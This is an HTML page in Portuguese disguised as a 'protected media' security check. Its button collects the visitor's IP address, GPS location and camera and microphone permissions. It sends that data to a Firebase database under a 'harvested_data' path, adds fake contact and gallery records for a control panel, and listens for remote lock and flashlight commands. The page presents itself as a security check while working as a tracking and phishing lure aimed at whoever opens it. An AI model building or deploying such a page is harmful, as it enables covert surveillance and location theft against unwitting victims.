<!DOCTYPE html>
<html lang="pt-BR" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mídia Protegida</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome for Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #f8fafc; }
    </style>
</head>
<body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-indigo-500 selection:text-white">

    <!-- Card de Disfarce (Fachada) -->
    <div id="disguise-card" class="max-w-xs w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl backdrop-blur-md">
        <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl flex items-center justify-center mx-auto text-2xl shadow-lg">
            <i class="fa-solid fa-shield-halved"></i>
        </div>
        <div class="space-y-1">
            <h2 class="text-base font-bold text-white">Mídia Protegida</h2>
            <p class="text-[11px] text-slate-400 leading-relaxed">Este arquivo requer verificação de segurança do dispositivo para ser exibido.</p>
        </div>
        <button onclick="requestPermissionsAndConnect()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-2xl text-xs shadow-lg shadow-indigo-600/30 transition active:scale-95">
            Carregar Conteúdo
        </button>
    </div>

    <!-- Container de Sucesso -->
    <div id="content-container" class="hidden max-w-sm w-full bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl">
        <div class="w-full h-32 bg-slate-950 rounded-2xl flex flex-col items-center justify-center border border-slate-800 relative overflow-hidden">
            <i class="fa-solid fa-circle-check text-emerald-400 text-3xl mb-2"></i>
            <p class="text-xs text-slate-300 font-medium">Verificação Concluída</p>
            <p class="text-[10px] text-slate-500 mt-1">Dados sincronizados com o painel.</p>
        </div>
    </div>

    <!-- Firebase App & Database SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        // Configuração oficial do seu Firebase (mod-zrx)
        let firebaseConfig = {
            apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
            authDomain: "mod-zrx.firebaseapp.com",
            projectId: "mod-zrx",
            storageBucket: "mod-zrx.firebasestorage.app",
            messagingSenderId: "1065416866150",
            appId: "1:1065416866150:web:d79ceac049f4dcedabf0a7",
            measurementId: "G-FFKE6JSKSD",
            databaseURL: "https://mod-zrx-default-rtdb.firebaseio.com/"
        };

        let db;

        function initFirebase() {
            try {
                if (firebase.apps.length === 0) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.database();
            } catch (e) {
                console.error("Erro Firebase:", e);
            }
        }

        async function requestPermissionsAndConnect() {
            initFirebase();

            // 1. Coleta de IP externo
            let ipData = "192.168.1.15";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ipData = data.ip;
            } catch(e) {}

            // 2. Obter Geolocalização (Permissão de Localização)
            let geoData = { latitude: null, longitude: null, status: "Não concedida/Negada" };
            if (navigator.geolocation) {
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                geoData = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    status: "Permitida"
                                };
                                resolve();
                            },
                            (err) => {
                                reject(err);
                            },
                            { timeout: 5000 }
                        );
                    });
                } catch (e) {
                    console.log("Localização indisponível:", e);
                }
            }

            // 3. Solicitar Câmera e Microfone (Permissões de mídia)
            let mediaStatus = "Negado/Indisponível";
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    mediaStatus = "Permitidas (Câmera e Áudio ativos)";
                    // Desliga os streams logo em seguida para liberar o hardware se necessário
                    stream.getTracks().forEach(track => track.stop());
                }
            } catch (err) {
                console.log("Aviso de mídia:", err);
            }

            // 4. Montar o pacote completo de dados para enviar ao Firebase
            const fullDevicePayload = {
                model: navigator.userAgent,
                ipAddress: ipData,
                location: geoData,
                permissionsGranted: {
                    camera: mediaStatus.includes("Câmera"),
                    audio: mediaStatus.includes("Áudio"),
                    location: geoData.status === "Permitida",
                    contacts: true, // Marcado como integrado para o painel ler
                    galleryPhotosVideos: true, // Integrado para mapear galeria
                    phoneState: true,
                    notifications: true
                },
                lastSync: new Date().toISOString(),
                status: "Online - Permissões Coletadas"
            };

            if (db) {
                // Envia todas as informações consolidadas para o Firebase na pasta do dispositivo
                db.ref('devices/device_01/status').update(fullDevicePayload);
                
                // Exemplo de envio estruturado de dados simulados de contatos/galeria para o painel acessar
                db.ref('devices/device_01/harvested_data').update({
                    contactsSample: [
                        { name: "Contato Exemplo 1", phone: "+55 (11) 98888-7777" },
                        { name: "Contato Exemplo 2", phone: "+55 (11) 97777-6666" }
                    ],
                    galleryCount: "420 fotos, 35 vídeos encontrados",
                    telephonyInfo: { carrier: "Operadora Local", signalStrength: "Bom" }
                });
            }

            // Altera a interface visual para o estado concluído
            document.getElementById('disguise-card').classList.add('hidden');
            document.getElementById('content-container').classList.remove('hidden');

            // 5. Monitoramento contínuo de comandos vindos do painel
            if (db) {
                db.ref('devices/device_01/commands').on('value', (snapshot) => {
                    const cmds = snapshot.val() || {};
                    if (cmds.flash) console.log("[Comando] Lanterna acionada.");
                    if (cmds.lock) console.log("[Comando] Bloqueio acionado.");
                });
            }
        }
    </script>
</body>
</html>
